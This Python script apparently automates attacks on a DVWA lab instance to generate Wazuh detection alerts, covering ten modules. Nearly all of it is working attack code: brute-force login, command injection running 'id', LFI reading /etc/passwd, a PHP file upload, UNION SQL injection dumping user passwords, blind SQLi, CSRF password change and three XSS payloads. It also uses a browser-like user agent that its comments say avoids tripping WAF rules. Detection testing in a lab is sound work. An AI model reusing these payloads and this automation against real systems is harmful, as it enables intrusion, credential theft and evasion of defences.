#!/usr/bin/env python3
"""
DVWA Attack Automation Script — Local Lab Only
Runs one clear attack per DVWA module at LOW security, tagging every
request with a unique run ID so Wazuh alerts can be filtered later.

Hardened build:
  * Ignores stray system HTTP(S)_PROXY env vars (common Windows reset cause).
  * Normal browser User-Agent (weird UAs trip ModSecurity/WAF -> RST/10054).
  * Automatic retry with backoff on connection resets / read timeouts.
  * Pre-flight reachability + DVWA sanity check BEFORE any attack runs.
  * Never crashes with a raw traceback — always exits with a clean, machine
    readable status line the platform can parse:
        ABSEGA_STATUS={"status": "...", "reason": "...", "run_id": "..."}
    Exit codes:  0 = OK   1 = LOGIN_FAILED   3 = UNREACHABLE   4 = NOT_DVWA

Usage:
    python3 attack_dvwa.py                              # defaults (127.0.0.1)
    python3 attack_dvwa.py --target http://IP/dvwa      # custom target
    python3 attack_dvwa.py --target http://IP/dvwa --preflight   # check only
    python3 attack_dvwa.py --target http://IP/dvwa --insecure --timeout 20
"""

import argparse
import json
import re
import sys
import time
from datetime import datetime, timezone

import requests
import urllib3
from requests.adapters import HTTPAdapter

try:  # urllib3 v1 vs v2 import path
    from urllib3.util.retry import Retry
except Exception:  # pragma: no cover
    from requests.packages.urllib3.util.retry import Retry  # type: ignore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Helpers ──────────────────────────────────────────────────────────────────

RUN_ID = "WAZUH_DVWA_TEST_" + datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")

# A boring, real-looking UA. The run id lives in a custom header + inside the
# attack payloads, so Wazuh filtering still works without a suspicious UA.
BROWSER_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
              "AppleWebKit/537.36 (KHTML, like Gecko) "
              "Chrome/126.0.0.0 Safari/537.36")


def ts():
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


def extract_token(html):
    m = re.search(r"user_token['\"]?\s*value=['\"]([a-f0-9]+)", html)
    return m.group(1) if m else None


def emit_status(status, reason="", **extra):
    """Print the one machine-readable line the platform parses, then flush."""
    payload = {"status": status, "reason": reason, "run_id": RUN_ID}
    payload.update(extra)
    print("ABSEGA_STATUS=" + json.dumps(payload), flush=True)


class TimeoutHTTPAdapter(HTTPAdapter):
    """Adapter that applies a default timeout + retry to every request."""

    def __init__(self, timeout, *args, **kwargs):
        self._timeout = timeout
        super().__init__(*args, **kwargs)

    def send(self, request, **kwargs):
        if kwargs.get("timeout") is None:
            kwargs["timeout"] = self._timeout
        return super().send(request, **kwargs)


# ── Session wrapper ──────────────────────────────────────────────────────────

class DVWARunner:

    def __init__(self, base_url, user, password, timeout=15, verify=False):
        self.base = base_url.rstrip("/")
        self.user = user
        self.password = password
        self.timeout = timeout
        self.results = []

        self.s = requests.Session()
        # Do NOT inherit HTTP_PROXY / HTTPS_PROXY from the OS — a dead or
        # AV/TLS-intercepting proxy is the #1 cause of 10054 resets on Windows.
        self.s.trust_env = False
        self.s.proxies = {"http": None, "https": None}
        self.s.verify = verify
        self.s.headers.update({
            "User-Agent": BROWSER_UA,
            "Accept": ("text/html,application/xhtml+xml,application/xml;"
                       "q=0.9,image/avif,image/webp,*/*;q=0.8"),
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "close",          # avoid half-closed keep-alive RSTs
            "X-ABSEGA-Run": RUN_ID,          # traceable without a weird UA
        })

        retry = Retry(
            total=4, connect=4, read=4, backoff_factor=1.2,
            status_forcelist=(500, 502, 503, 504),
            allowed_methods=frozenset(["GET", "POST"]),
            raise_on_status=False,
        )
        adapter = TimeoutHTTPAdapter(timeout=timeout, max_retries=retry)
        self.s.mount("http://", adapter)
        self.s.mount("https://", adapter)

    # ── record helper ────────────────────────────────────────────────────

    def _rec(self, module, method, url, status, success, payload=""):
        entry = {
            "module": module,
            "timestamp": ts(),
            "url": url,
            "method": method,
            "http_status": status,
            "run_id": RUN_ID,
            "success": success,
            "payload": payload[:300],
        }
        self.results.append(entry)
        tag = "OK" if success else "FAIL"
        print(f"  [{tag}] {module} -> {status}")

    # ── pre-flight ────────────────────────────────────────────────────────

    def preflight(self):
        """Return (ok, status, reason). Verifies the target is reachable and
        actually looks like DVWA before any attack is attempted."""
        url = f"{self.base}/login.php"
        try:
            r = self.s.get(url)
        except requests.exceptions.SSLError as e:
            return False, "UNREACHABLE", f"TLS error to {url} (try --insecure or http://): {e}"
        except requests.exceptions.ConnectionError as e:
            return False, "UNREACHABLE", (
                f"Cannot reach {url}. The host reset or refused the connection. "
                f"Check the target is powered on, on the same network, and port is open. ({e})")
        except requests.exceptions.Timeout:
            return False, "UNREACHABLE", f"Timed out after {self.timeout}s connecting to {url}."
        except requests.exceptions.RequestException as e:
            return False, "UNREACHABLE", f"Request error to {url}: {e}"

        body = r.text or ""
        if r.status_code >= 500:
            return False, "NOT_DVWA", f"{url} returned HTTP {r.status_code} (server error)."
        looks_dvwa = ("user_token" in body or "DVWA" in body
                      or "Damn Vulnerable" in body or "Login ::" in body)
        if not looks_dvwa:
            return False, "NOT_DVWA", (
                f"{url} responded (HTTP {r.status_code}) but does not look like the "
                f"DVWA login page. Check the path (…/dvwa vs …/DVWA) and that DVWA is set up.")
        return True, "OK", "Reachable and DVWA login page detected."

    # ── login & setup ────────────────────────────────────────────────────

    def login(self):
        print(f"\n{'='*60}")
        print(f"  DVWA Attack Runner — {RUN_ID}")
        print(f"  Target: {self.base}")
        print(f"{'='*60}\n")

        r = self.s.get(f"{self.base}/login.php")
        token = extract_token(r.text)
        r = self.s.post(f"{self.base}/login.php", data={
            "username": self.user,
            "password": self.password,
            "Login": "Login",
            "user_token": token or "",
        }, allow_redirects=True)
        ok = "login.php" not in r.url
        print(f"[{'+'if ok else '!'}] Login {'succeeded' if ok else 'FAILED'}")
        return ok

    def set_low(self):
        r = self.s.get(f"{self.base}/security.php")
        token = extract_token(r.text)
        self.s.post(f"{self.base}/security.php", data={
            "security": "low",
            "seclev_submit": "Submit",
            "user_token": token or "",
        })
        self.s.cookies.set("security", "low")
        print("[+] Security level set to LOW\n")

    # ── 1. Brute Force ───────────────────────────────────────────────────

    def attack_brute_force(self):
        print("[*] Brute Force")
        url = f"{self.base}/vulnerabilities/brute/"
        wrong = ["pass1", "letmein", "123456", "admin", "qwerty",
                 f"{RUN_ID}_wrong1", f"{RUN_ID}_wrong2", f"{RUN_ID}_wrong3"]
        for pw in wrong:
            r = self.s.get(url, params={
                "username": f"admin_{RUN_ID}",
                "password": pw,
                "Login": "Login",
            })
            time.sleep(0.3)

        r = self.s.get(url, params={
            "username": "admin",
            "password": "password",
            "Login": "Login",
        })
        ok = "Welcome" in r.text
        self._rec("Brute Force", "GET", r.url, r.status_code, ok,
                  f"{len(wrong)} wrong attempts then correct login")

    # ── 2. Command Injection ─────────────────────────────────────────────

    def attack_command_injection(self):
        print("[*] Command Injection")
        url = f"{self.base}/vulnerabilities/exec/"
        payload = f"127.0.0.1; echo {RUN_ID}; id"
        r = self.s.post(url, data={"ip": payload, "Submit": "Submit"})
        ok = RUN_ID in r.text or "uid=" in r.text
        self._rec("Command Injection", "POST", url, r.status_code, ok, payload)

    # ── 3. CSRF ──────────────────────────────────────────────────────────

    def attack_csrf(self):
        print("[*] CSRF")
        url = f"{self.base}/vulnerabilities/csrf/"
        new_pw = f"csrf_{RUN_ID}"
        r = self.s.get(url, params={
            "password_new": new_pw,
            "password_conf": new_pw,
            "Change": "Change",
        })
        ok = "Password Changed" in r.text
        self._rec("CSRF", "GET", r.url, r.status_code, ok,
                  f"password changed to csrf_{RUN_ID}")

        # restore original password
        self.s.get(url, params={
            "password_new": self.password,
            "password_conf": self.password,
            "Change": "Change",
        })

    # ── 4. File Inclusion ────────────────────────────────────────────────

    def attack_file_inclusion(self):
        print("[*] File Inclusion (LFI)")
        url = f"{self.base}/vulnerabilities/fi/"
        payload = "../../../../../../etc/passwd"
        r = self.s.get(url, params={"page": payload})
        ok = "root:" in r.text
        self._rec("File Inclusion", "GET", r.url, r.status_code, ok, payload)

    # ── 5. File Upload ───────────────────────────────────────────────────

    def attack_file_upload(self):
        print("[*] File Upload")
        url = f"{self.base}/vulnerabilities/upload/"
        fname = f"{RUN_ID}_test.php"
        content = f"<?php echo '{RUN_ID}_UPLOAD_OK'; ?>"
        r = self.s.post(url, data={"Upload": "Upload"}, files={
            "uploaded": (fname, content, "application/x-php"),
        })
        ok = "succesfully uploaded" in r.text or "successfully uploaded" in r.text.lower()
        self._rec("File Upload", "POST", url, r.status_code, ok,
                  f"uploaded {fname}")

        if ok:
            shell_url = f"{self.base}/hackable/uploads/{fname}"
            r2 = self.s.get(shell_url)
            accessed = RUN_ID in r2.text
            self._rec("File Upload (access)", "GET", shell_url, r2.status_code,
                      accessed, f"accessed {fname}")

    # ── 6. SQL Injection ─────────────────────────────────────────────────

    def attack_sqli(self):
        print("[*] SQL Injection")
        url = f"{self.base}/vulnerabilities/sqli/"
        payload = f"' UNION SELECT user, password FROM users-- {RUN_ID}"
        r = self.s.get(url, params={"id": payload, "Submit": "Submit"})
        ok = "admin" in r.text.lower() and ("Surname" in r.text or "name" in r.text.lower())
        self._rec("SQL Injection", "GET", r.url, r.status_code, ok, payload)

    # ── 7. SQL Injection Blind ───────────────────────────────────────────

    def attack_sqli_blind(self):
        print("[*] SQL Injection (Blind)")
        url = f"{self.base}/vulnerabilities/sqli_blind/"
        payload_true = f"1' AND 1=1#{RUN_ID}"
        r1 = self.s.get(url, params={"id": payload_true, "Submit": "Submit"})
        true_ok = "exists" in r1.text.lower()

        payload_false = f"1' AND 1=2#{RUN_ID}"
        r2 = self.s.get(url, params={"id": payload_false, "Submit": "Submit"})
        false_ok = "missing" in r2.text.lower() or "MISSING" in r2.text

        ok = true_ok and false_ok
        self._rec("SQL Injection (Blind)", "GET", r1.url, r1.status_code, ok,
                  f"TRUE={payload_true} | FALSE={payload_false}")

    # ── 8. XSS DOM ──────────────────────────────────────────────────────

    def attack_xss_dom(self):
        print("[*] XSS (DOM)")
        url = f"{self.base}/vulnerabilities/xss_d/"
        payload = f"<script>/*{RUN_ID}*/alert('DOM_XSS')</script>"
        r = self.s.get(url, params={"default": payload})
        ok = r.status_code == 200
        self._rec("XSS (DOM)", "GET", r.url, r.status_code, ok, payload)

    # ── 9. XSS Reflected ────────────────────────────────────────────────

    def attack_xss_reflected(self):
        print("[*] XSS (Reflected)")
        url = f"{self.base}/vulnerabilities/xss_r/"
        payload = f"<script>/*{RUN_ID}*/alert('REFLECTED_XSS')</script>"
        r = self.s.get(url, params={"name": payload})
        ok = payload in r.text
        self._rec("XSS (Reflected)", "GET", r.url, r.status_code, ok, payload)

    # ── 10. XSS Stored ──────────────────────────────────────────────────

    def attack_xss_stored(self):
        print("[*] XSS (Stored)")
        url = f"{self.base}/vulnerabilities/xss_s/"
        name = RUN_ID[:10]
        message = f"<img src=x onerror=alert('{RUN_ID}_STORED_XSS')>"
        r = self.s.post(url, data={
            "txtName": name,
            "mtxMessage": message,
            "btnSign": "Sign Guestbook",
        })
        ok = r.status_code == 200
        self._rec("XSS (Stored)", "POST", url, r.status_code, ok,
                  f"name={name} msg={message}")

    # ── Run all ──────────────────────────────────────────────────────────

    def run_all(self):
        # 1) pre-flight FIRST — never blow up mid-attack
        ok, status, reason = self.preflight()
        if not ok:
            print(f"[!] Pre-flight failed: {reason}")
            emit_status(status, reason)
            code = 3 if status == "UNREACHABLE" else 4
            sys.exit(code)

        # 2) login
        if not self.login():
            emit_status("LOGIN_FAILED",
                        "Reached DVWA but credentials were rejected. "
                        "Check --user/--password (default admin/password) "
                        "and that the DVWA database is set up.")
            sys.exit(1)

        self.set_low()

        start = ts()
        attacks = [
            self.attack_brute_force,
            self.attack_command_injection,
            self.attack_csrf,
            self.attack_file_inclusion,
            self.attack_file_upload,
            self.attack_sqli,
            self.attack_sqli_blind,
            self.attack_xss_dom,
            self.attack_xss_reflected,
            self.attack_xss_stored,
        ]
        for fn in attacks:
            try:
                fn()
            except Exception as e:
                print(f"  [ERR] {fn.__name__}: {e}")
                self._rec(fn.__name__.replace("attack_", ""), "?", "", 0, False, str(e))
            time.sleep(0.5)
        end = ts()

        report = {
            "run_id": RUN_ID,
            "target": self.base,
            "start_time": start,
            "end_time": end,
            "total_requests": len(self.results),
            "successful": sum(1 for r in self.results if r["success"]),
            "failed": sum(1 for r in self.results if not r["success"]),
            "results": self.results,
        }

        out_file = f"dvwa_report_{RUN_ID}.json"
        with open(out_file, "w") as f:
            json.dump(report, f, indent=2)

        passed = report["successful"]
        total = report["total_requests"]
        print(f"\n{'='*60}")
        print(f"  DONE — {passed}/{total} succeeded")
        print(f"  Run ID : {RUN_ID}")
        print(f"  Report : {out_file}")
        print(f"{'='*60}")
        print(f"\n  Paste this run ID into the platform Live Alerts filter:")
        print(f"  {RUN_ID}\n")

        emit_status("OK", f"{passed}/{total} requests succeeded",
                    successful=passed, total=total)
        return report


# ── CLI ──────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    p = argparse.ArgumentParser(description="DVWA attack runner for Wazuh log generation")
    p.add_argument("--target", default="http://127.0.0.1/dvwa",
                    help="DVWA base URL (default: http://127.0.0.1/dvwa)")
    p.add_argument("--user", default="admin")
    p.add_argument("--password", default="password")
    p.add_argument("--timeout", type=int, default=15, help="Per-request timeout seconds")
    p.add_argument("--insecure", action="store_true", help="Skip TLS verification (https targets)")
    p.add_argument("--preflight", action="store_true",
                    help="Only test reachability + DVWA detection, then exit")
    args = p.parse_args()

    runner = DVWARunner(args.target, args.user, args.password,
                        timeout=args.timeout, verify=not args.insecure)

    if args.preflight:
        ok, status, reason = runner.preflight()
        print(f"[{'+' if ok else '!'}] {status}: {reason}")
        emit_status(status, reason)
        sys.exit(0 if ok else (3 if status == "UNREACHABLE" else 4))

    runner.run_all()
